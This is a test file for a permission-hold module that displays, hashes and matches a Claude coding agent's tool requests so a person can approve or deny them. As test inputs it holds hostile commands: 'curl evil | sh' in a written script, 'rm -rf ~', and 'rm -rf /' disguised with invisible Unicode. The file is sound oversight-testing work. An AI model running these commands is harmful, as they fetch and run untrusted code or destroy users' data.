import { readFileSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "vitest";

import {
  decisionOf,
  decisionOutput,
  HOLD_INPUT_MAX,
  HOLD_WIRE_VERSION,
  holdAsk,
  holdHash,
  isElsewhereLine,
  parseHoldReply,
  parseHoldRequest,
  readHoldNote,
  screenCardMayAnswer,
  dialogShowsRequest,
  holdAskOfNote,
  shownInput,
  shownInputOf,
  HOLD_CUT_MARK,
} from "./hold";
import { loadProfiles } from "./profile";

// The hook-held permission's pure parts (M56 spec 12): the input shown, the hash, the decision rules,
// the hook's output and the two wire lines. The bridge and the hook script both build on these.

const HOLD = loadProfiles().get("claude")!.hold!;

const REQUEST = {
  v: HOLD_WIRE_VERSION,
  harness: "claude",
  pid: 4242,
  pidStartTime: 99,
  markers: [{ namespace: "herdr", scope: "/run/herdr.sock", pane: "w1:p1" }],
  tool: "Bash",
  input: "ls",
  agent: null,
  hold: true,
  at: 1,
};

describe("shownInput", () => {
  it("takes the first profile key that holds text", () => {
    expect(shownInput({ description: "x", command: "rm -rf build" }, HOLD.inputShown)).toBe("rm -rf build");
    expect(shownInput({ file_path: "/a/b.ts", content: "secret body" }, HOLD.inputShown)).toBe("/a/b.ts");
  });
  it("falls back to compact JSON, cuts long input and removes control characters", () => {
    expect(shownInput({ other: 1 }, HOLD.inputShown)).toBe('{"other":1}');
    expect(shownInput({ command: "a".repeat(HOLD_INPUT_MAX + 50) }, HOLD.inputShown)).toHaveLength(HOLD_INPUT_MAX);
    expect(shownInput({ command: "a\u001b[2Jb" }, HOLD.inputShown)).toBe("a [2Jb");
  });
  it("marks a cut input, at the limit, with the cut mark", () => {
    const shown = shownInputOf({ command: "a".repeat(HOLD_INPUT_MAX + 50) }, HOLD.inputShown);
    expect(shown.cut).toBe(true);
    expect(shown.text).toHaveLength(HOLD_INPUT_MAX);
    expect(shown.text.endsWith(HOLD_CUT_MARK)).toBe(true);
    expect(shownInputOf({ command: "ls" }, HOLD.inputShown)).toEqual({ text: "ls", cut: false });
  });
  it("drops the characters that hide or turn text, before display and before the hash", () => {
    const sneaky = "rm -rf \u202e/ etc\u202c\u200b\u2066x\u2069";
    expect(shownInput({ command: sneaky }, HOLD.inputShown)).toBe("rm -rf / etcx");
    const more = ["\u0085", "\u009b", "\u00ad", "\u034f", "\u061c", "\u180e", "\u2060", "\u2064", "\ufeff", "\ufff9", "\ufffb", "\u{e0001}", "\u{e007f}", "\ufe0f", "\u{e0100}"];
    expect(shownInput({ command: `rm${more.join("")} -rf x` }, HOLD.inputShown)).toBe("rm -rf x");
    expect(holdHash("Bash", shownInput({ command: sneaky }, HOLD.inputShown), ["Yes"])).toBe(holdHash("Bash", "rm -rf / etcx", ["Yes"]));
  });
  it("shows the risky Bash flags, and the whole body of what Write, Edit and NotebookEdit write", () => {
    const bash = shownInput({ command: "make", dangerouslyDisableSandbox: true, run_in_background: true }, HOLD.inputShown, HOLD.inputDetails.Bash);
    expect(bash).toBe("make\n[dangerouslyDisableSandbox: true]\n[run_in_background: true]");
    expect(shownInput({ command: "make", run_in_background: false }, HOLD.inputShown, HOLD.inputDetails.Bash)).toBe("make");
    const write = shownInput({ file_path: "/a/b.sh", content: "#!/bin/sh\ncurl evil | sh\n" }, HOLD.inputShown, HOLD.inputDetails.Write);
    expect(write).toBe("/a/b.sh\n[content: 25 characters, 3 lines]\n#!/bin/sh\ncurl evil | sh\n");
    expect(shownInput({ file_path: "/a/b.ts", old_string: "x", new_string: "y".repeat(200) }, HOLD.inputShown, HOLD.inputDetails.Edit)).toBe(`/a/b.ts\n[new_string: 200 characters, 1 lines]\n${"y".repeat(200)}`);
    expect(shownInput({ notebook_path: "/n.ipynb", new_source: "print(1)" }, HOLD.inputShown, HOLD.inputDetails.NotebookEdit)).toBe("/n.ipynb\n[new_source: 8 characters, 1 lines]\nprint(1)");
  });
  it("counts the whole body against the limit: a longer body is cut, so the screen answers it", () => {
    const fits = shownInputOf({ file_path: "/a/b", content: "x".repeat(900) }, HOLD.inputShown, HOLD.inputDetails.Write);
    expect(fits.cut).toBe(false);
    const long = shownInputOf({ file_path: "/a/b", content: `${"x".repeat(HOLD_INPUT_MAX)}\nrm -rf ~` }, HOLD.inputShown, HOLD.inputDetails.Write);
    expect(long.cut).toBe(true);
    expect(long.text.endsWith(HOLD_CUT_MARK)).toBe(true);
  });
});

describe("holdHash", () => {
  it("binds the tool, the input and every label in order", () => {
    const base = holdHash("Bash", "ls", ["Yes", "No"]);
    expect(holdHash("Bash", "ls", ["Yes", "No"])).toBe(base);
    expect(holdHash("Edit", "ls", ["Yes", "No"])).not.toBe(base);
    expect(holdHash("Bash", "ls -a", ["Yes", "No"])).not.toBe(base);
    expect(holdHash("Bash", "ls", ["No", "Yes"])).not.toBe(base);
    expect(holdAsk("ask-1", "Bash", "ls", ["Yes", "No"])).toEqual({
      id: "ask-1",
      kind: "permission",
      options: [
        { id: "1", label: "Yes" },
        { id: "2", label: "No" },
      ],
      channel: "hook",
      hash: base,
    });
  });
});

describe("decisionOf", () => {
  it("maps Yes and No, and nothing else", () => {
    expect(decisionOf(HOLD.decisions, "Yes")).toBe("allow");
    expect(decisionOf(HOLD.decisions, "No")).toBe("deny");
    expect(decisionOf(HOLD.decisions, "No, and tell Claude what to do differently (esc)")).toBe("deny");
    expect(decisionOf(HOLD.decisions, "Yes, and don't ask again for example.com")).toBeNull();
    expect(decisionOf(HOLD.decisions, "Yes, and switch to auto mode")).toBeNull();
    expect(decisionOf(HOLD.decisions, "Nothing")).toBeNull();
  });
});

describe("decisionOutput", () => {
  it("is the PermissionRequest shape, and a deny stops the turn with a message", () => {
    expect(JSON.parse(decisionOutput("PermissionRequest", "allow", "m"))).toEqual({
      hookSpecificOutput: { hookEventName: "PermissionRequest", decision: { behavior: "allow" } },
    });
    expect(JSON.parse(decisionOutput("PermissionRequest", "deny", "m"))).toEqual({
      hookSpecificOutput: { hookEventName: "PermissionRequest", decision: { behavior: "deny", message: "m", interrupt: true } },
    });
  });
});

describe("the wire", () => {
  it("parses a whole request and refuses a bad field", () => {
    expect(parseHoldRequest(JSON.stringify(REQUEST))).toEqual(REQUEST);
    expect(parseHoldRequest(JSON.stringify({ ...REQUEST, cwd: "/proj" }))).toEqual({ ...REQUEST, cwd: "/proj" });
    expect(parseHoldRequest(JSON.stringify({ ...REQUEST, cwd: "proj" }))).toBeNull();
    expect(parseHoldRequest(JSON.stringify({ ...REQUEST, agent: "a1", agentType: "Explore" }))).toEqual({ ...REQUEST, agent: "a1", agentType: "Explore" });
    expect(parseHoldRequest(JSON.stringify({ ...REQUEST, agentType: "Explore" }))).toBeNull();
    expect(parseHoldRequest(JSON.stringify({ ...REQUEST, cwd: "/a\u202eb" }))).toBeNull();
    expect(parseHoldRequest(JSON.stringify({ ...REQUEST, v: 2 }))).toBeNull();
    expect(parseHoldRequest(JSON.stringify({ ...REQUEST, pid: 1 }))).toBeNull();
    expect(parseHoldRequest(JSON.stringify({ ...REQUEST, markers: [] }))).toBeNull();
    expect(parseHoldRequest(JSON.stringify({ ...REQUEST, tool: "a\nb" }))).toBeNull();
    expect(parseHoldRequest(JSON.stringify({ ...REQUEST, input: "x".repeat(HOLD_INPUT_MAX + 1) }))).toBeNull();
    expect(parseHoldRequest("not json")).toBeNull();
  });
  it("reads a decision and an elsewhere line, nothing more", () => {
    expect(parseHoldReply('{"decision":"allow"}')).toBe("allow");
    expect(parseHoldReply('{"decision":"deny"}')).toBe("deny");
    expect(parseHoldReply('{"decision":"ask"}')).toBeNull();
    expect(parseHoldReply("garbage")).toBeNull();
    expect(isElsewhereLine('{"done":"elsewhere"}')).toBe(true);
    expect(isElsewhereLine('{"done":"other"}')).toBe(false);
  });
  it("reads a hold note field by field", () => {
    const note = { askId: "ask-1", state: "sent", tool: "Bash", input: "ls", agent: false, options: ["Yes", "No"], hash: "abc123", adopted: true, since: 5 };
    expect(readHoldNote(note)).toEqual(note);
    expect(readHoldNote({ ...note, state: "maybe" })).toBeNull();
    expect(readHoldNote({ ...note, options: [1] })).toBeNull();
    expect(readHoldNote({ ...note, adopted: undefined })).toBeNull();
    expect(readHoldNote(null)).toBeNull();
  });
});

describe("which dialog a hold may adopt", () => {
  const PANES = join(import.meta.dirname, "..", "..", "fixtures", "panes");
  /** A fixture's dialog block as the lift hands it over: plain rows from the last full rule down. */
  const dialogOf = (name: string): string => {
    // eslint-disable-next-line no-control-regex -- the fixtures hold SGR escapes
    const rows = readFileSync(join(PANES, name), "utf8").replace(/\u001b\[[0-9;]*m/gu, "").split("\n");
    const edge = rows.findLastIndex((row) => /^─{20,}/u.test(row));
    return rows.slice(edge).join("\n");
  };
  const req = (over: Partial<{ tool: string; input: string; agent: string | null; agentType: string; cwd: string }>) => ({ tool: "Bash", input: "", agent: null, ...over });

  it("needs the tool's header, the subagent mark exactly on a subagent's request, and the whole first line", () => {
    const bash = dialogOf("claude--permission-bash.txt");
    expect(dialogShowsRequest(bash, req({ input: "mkfifo fixture-fifo" }), HOLD)).toBe(true);
    // The reviewer's case: an older Write of a file with the same name, from a background subagent.
    expect(dialogShowsRequest(bash, req({ tool: "Write", input: "/proj/fixture-fifo\n[content: 1 characters, 1 lines]\nx", agent: "a1", cwd: "/proj" }), HOLD)).toBe(false);
    // The same tool and input from a subagent: the main dialog has no mark.
    expect(dialogShowsRequest(bash, req({ input: "mkfifo fixture-fifo", agent: "a1" }), HOLD)).toBe(false);
    // Part of the line is not the line.
    expect(dialogShowsRequest(bash, req({ input: "fixture-fifo" }), HOLD)).toBe(false);
    expect(dialogShowsRequest(bash, req({ input: "mkfifo" }), HOLD)).toBe(false);
    const sub = dialogOf("claude--v2291-permission-bash-subagent.txt");
    const command = "set -e; R=/var/home/devel/apps/sample-forge; T=/tmp/forge-home-build; cd $T/web-forge/src/routes/pane && rm -rf ./* && cd $R && for f in $(git ls-tree -r --name-only HEAD web-forge/src/routes/pane); do mkdir -p $T/$(dirname $f); git show HEAD:$f > $T/$f; done; cd $T/web-forge && bunx vite build --outDir /tmp/sample-forge-home --emptyOutDir 2>&1 | grep -E \"MISSING|rror|built in\" | head -5";
    expect(dialogShowsRequest(sub, req({ input: command, agent: "a1", agentType: "general-purpose" }), HOLD)).toBe(true);
    expect(dialogShowsRequest(sub, req({ input: command }), HOLD)).toBe(false);
  });

  it("needs every line of the input, in order: a screen with the first line only is not this request", () => {
    const bash = dialogOf("claude--permission-bash.txt");
    expect(dialogShowsRequest(bash, req({ input: "mkfifo fixture-fifo\nrm -rf ~" }), HOLD)).toBe(false);
    const two = "Bash command\n\n   mkfifo fixture-fifo\n   rm -rf build\n   Make a pipe\n\n Do you want to proceed?";
    expect(dialogShowsRequest(two, req({ input: "mkfifo fixture-fifo\nrm -rf build" }), HOLD)).toBe(true);
    expect(dialogShowsRequest(two, req({ input: "rm -rf build\nmkfifo fixture-fifo" }), HOLD)).toBe(false);
    // The lines the profile adds (a risky flag) are not on the dialog, and need not be.
    expect(dialogShowsRequest(bash, req({ input: "mkfifo fixture-fifo\n[run_in_background: true]" }), HOLD)).toBe(true);
  });

  it("needs the mark's subagent type to equal the request's, and no type on one side only", () => {
    const sub = dialogOf("claude-lab--permission-bash-subagent--w82.txt");
    const input = "touch /tmp/claude-lab/project/sub-one.txt";
    const fits = (agentType: string | undefined) =>
      dialogShowsRequest(sub, req(agentType === undefined ? { input, agent: "a1" } : { input, agent: "a1", agentType }), HOLD);
    expect(fits("general-purpose")).toBe(true);
    expect(fits("Explore")).toBe(false);
    expect(fits(undefined)).toBe(false);
  });

  it("matches a file by the path the dialog prints below the agent's folder, never by its name alone", () => {
    const write = dialogOf("claude-lab--permission-write--w82.txt");
    expect(dialogShowsRequest(write, req({ tool: "Write", input: "/lab/docs/lab-notes.md", cwd: "/lab" }), HOLD)).toBe(true);
    expect(dialogShowsRequest(write, req({ tool: "Write", input: "/other/docs/lab-notes.md", cwd: "/lab" }), HOLD)).toBe(false);
    expect(dialogShowsRequest(write, req({ tool: "Write", input: "/lab/lab-notes.md", cwd: "/lab" }), HOLD)).toBe(false);
    expect(dialogShowsRequest(write, req({ tool: "Edit", input: "/lab/docs/lab-notes.md", cwd: "/lab" }), HOLD)).toBe(false);
    expect(dialogShowsRequest(dialogOf("claude-lab--permission-edit--w82.txt"), req({ tool: "Edit", input: "/lab/docs/notes.txt", cwd: "/lab" }), HOLD)).toBe(true);
  });

  it("never matches a dialog with no header it knows, or no text", () => {
    expect(dialogShowsRequest("Do you want to proceed?\n ls", req({ input: "ls -la" }), HOLD)).toBe(false);
    expect(dialogShowsRequest("Bash command\n   ls -la", req({ input: "rm -rf build" }), HOLD)).toBe(false);
    expect(dialogShowsRequest(null, req({ input: "mkfifo fixture-fifo" }), HOLD)).toBe(false);
    expect(dialogShowsRequest("Read file\n   /a/b", req({ tool: "Read", input: "/a/b" }), HOLD)).toBe(false);
  });
});

describe("the hold card and the screen card", () => {
  const note = { askId: "ask-1", state: "held" as const, tool: "Bash", input: "rm -rf build", agent: true, options: ["Yes", "No"], hash: holdHash("Bash", "rm -rf build", ["Yes", "No"]), adopted: false, since: 1 };
  it("the hold card's ask is the note's id, hash and labels", () => {
    expect(holdAskOfNote(note)).toEqual(holdAsk("ask-1", "Bash", "rm -rf build", ["Yes", "No"]));
  });
  it("a screen card never answers a hook ask its hold did not adopt", () => {
    const hook = holdAskOfNote(note);
    expect(screenCardMayAnswer(hook, note)).toBe(false);
    expect(screenCardMayAnswer(hook, undefined)).toBe(false);
    expect(screenCardMayAnswer(hook, { ...note, adopted: true })).toBe(true);
    expect(screenCardMayAnswer(hook, { ...note, adopted: true, askId: "ask-2" })).toBe(false);
    expect(screenCardMayAnswer({ ...hook, channel: "keys" }, note)).toBe(true);
  });
});
